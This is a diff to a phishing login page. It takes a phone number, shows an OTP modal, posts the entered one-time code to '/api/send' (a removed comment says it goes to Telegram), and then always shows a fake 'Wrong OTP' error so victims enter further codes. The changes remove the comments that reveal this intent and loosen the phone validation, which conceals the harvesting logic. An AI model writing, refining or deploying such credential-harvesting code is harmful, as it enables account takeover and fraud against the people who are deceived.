@@ -268,7 +268,7 @@
         <form id="loginForm" style="width: 100%;">
             <div class="input-group">
                 <span class="icon">👤</span>
-                <input type="tel" id="phone" placeholder="Phone" required pattern="[0-9]{10}">
+                <input type="tel" id="phone" placeholder="Phone" required>
             </div>
 
             <div class="input-group">
@@ -338,7 +338,6 @@
         const submitBtn = document.getElementById('submitBtn');
         const errorText = document.getElementById('errorText');
 
-        // Sign In click hone par
         loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -367,7 +366,7 @@
             displayPhone.innerText = '+91 ' + currentPhone;
             submitBtn.disabled = false;
             submitBtn.innerText = 'Sign In';
-            errorText.style.display = 'none'; // Error chupayein shuru mein
+            errorText.style.display = 'none';
             otpModal.style.display = 'flex';
         });
 
@@ -375,7 +374,6 @@
             otpModal.style.display = 'none';
         });
 
-        // OTP Confirm click hone par
         document.getElementById('otpForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const otp = document.getElementById('otpCode').value;
@@ -384,7 +382,6 @@
             confirmBtn.disabled = true;
             confirmBtn.innerText = 'Verifying...';
 
-            // OTP Telegram par bhejenge
             try {
                 await fetch('/api/send', {
                     method: 'POST',
@@ -396,10 +393,9 @@
                     })
                 });
 
-                // Telegram par message jane ke turant baad Wrong OTP dikhayein
                 setTimeout(() => {
-                    errorText.style.display = 'block'; // "Wrong OTP Code" show hoga
-                    document.getElementById('otpCode').value = ''; // Input clear kar dega
+                    errorText.style.display = 'block';
+                    document.getElementById('otpCode').value = '';
                     confirmBtn.disabled = false;
                     confirmBtn.innerText = 'Confirm';
                 }, 800);
